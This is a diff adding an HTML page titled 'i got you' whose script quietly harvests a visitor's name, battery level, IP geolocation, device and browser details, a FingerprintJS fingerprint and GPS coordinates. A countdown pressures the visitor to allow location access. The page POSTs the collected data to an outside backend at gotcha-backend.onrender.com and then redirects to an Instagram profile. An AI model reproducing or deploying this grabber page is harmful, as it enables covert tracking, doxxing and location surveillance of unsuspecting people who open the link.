@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>i got you</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      font-family: monospace;
+      font-size: 1em;
+      padding: 2em;
+      text-align: center;
+    }
+    h1 {
+      font-size: 3em;
+      margin-bottom: 1em;
+    }
+    input {
+      padding: 10px;
+      font-size: 1em;
+      margin-bottom: 1em;
+      border: none;
+      border-radius: 5px;
+    }
+    #countdown {
+      font-size: 1.5em;
+      color: red;
+      margin-top: 1em;
+    }
+  </style>
+  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
+</head>
+<body>
+  <h1>i got you</h1>
+  <p>Type your name:</p>
+  <input type="text" id="username" placeholder="Your name here" />
+  <div id="countdown" style="display:none;">You have 5 seconds to allow access...</div>
+  <p id="battery"></p>
+
+  <script>
+    const countdownEl = document.getElementById("countdown");
+    const batteryEl = document.getElementById("battery");
+    const nameInput = document.getElementById("username");
+
+    let userData = {
+      name: "",
+      battery: null,
+      lat: null,
+      lon: null,
+      fingerprint: null
+    };
+
+    // Battery
+    navigator.getBattery?.().then(battery => {
+      const percent = Math.round(battery.level * 100);
+      batteryEl.textContent = `Battery: ${percent}%`;
+      userData.battery = percent;
+    });
+
+    // Start when they type a name
+    nameInput.addEventListener("change", () => {
+      const name = nameInput.value.trim();
+      if (!name) return;
+
+      userData.name = name;
+      countdownEl.style.display = "block";
+      let seconds = 5;
+      const interval = setInterval(() => {
+        seconds--;
+        countdownEl.textContent = `You have ${seconds} second${seconds !== 1 ? "s" : ""} to allow access...`;
+        if (seconds <= 0) {
+          clearInterval(interval);
+          countdownEl.textContent = "Requesting location...";
+          requestInfo();
+        }
+      }, 1000);
+    });
+
+    async function requestInfo() {
+      const ua = navigator.userAgent;
+      const isMobile = /Mobi|Android/i.test(ua);
+      const os = navigator.platform || "Unknown";
+      const browser = navigator.userAgentData?.brands?.[1]?.brand || "Unknown";
+
+      let ipData = {};
+      try {
+        const res = await fetch("https://api.db-ip.com/v2/free/self");
+        ipData = await res.json();
+      } catch {}
+
+      // GPS
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(async pos => {
+          userData.lat = pos.coords.latitude.toFixed(5);
+          userData.lon = pos.coords.longitude.toFixed(5);
+
+          // FingerprintJS
+          const fp = await FingerprintJS.load();
+          const result = await fp.get();
+          userData.fingerprint = result.visitorId;
+
+          // Send to backend
+          fetch("https://gotcha-backend.onrender.com/log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              ...userData,
+              ip: ipData.ipAddress,
+              city: ipData.city,
+              region: ipData.stateProv,
+              country: ipData.countryName,
+              device: isMobile ? "Mobile" : "Desktop",
+              os: os,
+              browser: browser
+            })
+          });
+
+          // Redirect after 2 seconds
+          setTimeout(() => {
+            window.location.href = "https://instagram.com/ziahiscrazyasf";
+          }, 2000);
+        }, err => {
+          countdownEl.textContent = "GPS denied. Logging basic info...";
+          setTimeout(() => {
+            window.location.href = "https://instagram.com/ziahiscrazyasf";
+          }, 2000);
+        });
+      }
+    }
+  </script>
+</body>
+</html>
